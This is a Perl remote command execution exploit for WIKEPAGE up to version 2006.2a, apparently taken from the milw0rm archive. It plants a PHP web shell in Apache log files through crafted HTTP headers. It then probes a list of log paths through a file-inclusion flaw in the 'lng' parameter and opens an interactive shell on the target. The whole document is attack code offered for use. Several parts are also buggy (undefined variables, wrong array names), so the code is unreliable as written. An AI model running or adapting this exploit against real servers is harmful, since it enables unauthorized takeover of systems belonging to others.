#!/usr/bin/perl
#
# WIKEPAGE &lt;= V2006.2a Opus 10 Remote Command Execution Exploit
# -------------------------------------------------------------
# IHST: h4ckerz.com / hackerz.ir
# AST : Aria-Security.Net
# Kapda : kapda.ir
#
#### (c)oded &amp; discovered By Hessam-x ( Hessamx -at- Hessamx.net)

use IO::Socket;
use LWP::Simple;

print &quot;-------------------------------------------------------------\n&quot;;
print &quot;=  WIKEPAGE &lt;= V2006.2a Remote Command Execution Exploit    =\n&quot;;
print &quot;=            By Hessam-x  - www.Hessamx.net                 =\n&quot;;
print &quot;-----------------------------------------------------------\n\n&quot;;

if (@ARGV &lt; 2)
{
	print &quot;[*] Usage: hxxpl.pl [host] [path]\n\n&quot;;
	exit();
}

    $server=$ARGV[0];
    $path=$ARGV[1];
    print &quot; SERVER : $server \n&quot;;
    print &quot; Path   : $path   \n&quot;;
    print &quot;-------------------------------------------\n&quot;;

$pcode =&quot;&lt;?php ob_clean();echo _Hessamx_;passthru(\$_GET[cmd]);echo _xHessam_;die; ?&gt;&quot;;
$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$server&quot;, PeerPort=&gt;&quot;http(80)&quot;) || die &quot;[-] Cannot not connect to host !\n&quot;;

 print $socket &quot;GET &quot;.$path.$pcode.&quot; HTTP/1.1\r\n&quot;;
 print $socket &quot;User-Agent: &quot;.$pcode.&quot;\r\n&quot;;
 print $socket &quot;Host: &quot;.$server.&quot;\r\n&quot;;
 print $socket &quot;Connection: close\r\n\r\n&quot;;
 close($socket);

print &quot;[+] PHP code injection in log file finished. \n&quot;;
$log = &quot;no&quot;;
@apache=(
  &quot;/var/log/httpd/access_log&quot;,&quot;/var/log/httpd/error_log&quot;,
  &quot;/var/log/apache/error.log&quot;,&quot;/var/log/apache/access.log&quot;,  
  &quot;/apache/logs/error.log&quot;, &quot;/apache/logs/access.log&quot;,
  &quot;/etc/httpd/logs/acces_log&quot;,&quot;/etc/httpd/logs/acces.log&quot;,
  &quot;/etc/httpd/logs/error_log&quot;,&quot;/etc/httpd/logs/error.log&quot;,
  &quot;/var/www/logs/access_log&quot;,&quot;/var/www/logs/access.log&quot;,
  &quot;/usr/local/apache/logs/access_log&quot;,&quot;/usr/local/apache/logs/access.log&quot;,
  &quot;/var/log/apache/access_log&quot;,&quot;/var/log/apache/access.log&quot;,
  &quot;/var/log/access_log&quot;,&quot;/var/www/logs/error_log&quot;,
  &quot;/www/logs/error.log&quot;,&quot;/usr/local/apache/logs/error_log&quot;,
  &quot;/usr/local/apache/logs/error.log&quot;,&quot;/var/log/apache/error_log&quot;,
  &quot;/var/log/apache/error.log&quot;,&quot;/var/log/access_log&quot;,&quot;/var/log/error_log&quot;,
);
for ($i=0; $i&lt;=$#apache; $i++)
  {
 
print &quot;[+] Apache Path : &quot;.$i.&quot;\n&quot;;

$sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;$server, Timeout  =&gt; 10, PeerPort=&gt;&quot;http(80)&quot;) || die &quot;[-] cannot connect to host! \n&quot;;

  print $sock &quot;GET &quot;.$path.&quot;index.php&amp;cmd=id&amp;lng=&quot;.$path[$i].&quot;%00 HTTP/1.1\r\n&quot;;
  print $sock &quot;Host: &quot;.$server.&quot;\r\n&quot;;
  print $sock &quot;Connection: close\r\n\r\n&quot;;

    $out = &quot;&quot;;
    while ($answer = &lt;$sock&gt;) 
    {
    $out.=$answer;
    }
    close($sock);


if ($out =~ m/_Hessamx_(.*?)_xHessam_/ms)
  {
  print &quot;[+] Log File found ! [ $i ] \n\n&quot;;
  $log = $i;
  $i = $#path
  }
   
  }
if ($log eq &quot;no&quot;) {
    print &quot;[-] Can not found log file ! \n&quot;;
    print &quot;\n[-] Exploit Failed ! ... \n&quot;;
    exit;
   }
print &quot;[Hessam-x\@ $server] \$ &quot;;
$cmd = &lt;STDIN&gt;;

while($cmd !~ &quot;exit&quot;)
{
	$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$serv&quot;, PeerPort=&gt;&quot;80&quot;) || die &quot;[-] Cannot connect to host !\n&quot;;
	
	print $socket &quot;GET &quot;.$path.&quot;index.php?cmd=&quot;.$cmd.&quot;&amp;lng=../../../../../../../../..&quot;.$path[$log].&quot;%00 HTTP/1.1\r\n&quot;;
	print $socket &quot;Host: &quot;.$serv.&quot;\r\n&quot;;
	print $socket &quot;Accept: */*\r\n&quot;;
        print $socket &quot;Connection: close\r\n\n&quot;;	
	
	while ($answer = &lt;$socket&gt;)
	{
	    print $answer;
	}
	
	print &quot;[Hessam-x\@ $server ] \$ &quot;;
	$cmd = &lt;STDIN&gt;;	
}

# milw0rm.com [2006-08-24]
